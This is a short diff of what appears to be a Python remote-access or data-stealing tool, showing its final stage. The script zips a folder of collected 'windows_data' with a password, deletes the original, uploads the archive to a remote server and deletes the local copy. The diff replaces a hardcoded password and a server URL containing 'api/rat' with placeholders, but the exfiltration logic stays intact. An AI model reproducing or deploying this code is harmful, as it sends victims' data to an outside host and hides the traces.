@@ -200,9 +200,9 @@ if __name__ == '__main__':
             print("\t------\n")
 
     # Create encrypted zip in Roaming folder and delete original folder
-    password = 'server884063'
+    password = 'your_pass'
     zip_path = create_encrypted_zip_and_delete_folder('windows_data_36', password)
     
     # Upload zip to server and delete the local copy
-    server_url = "https://dkydivyansh.com/Project/api/rat/"
+    server_url = "Your_server"
     upload_to_server(zip_path, server_url)
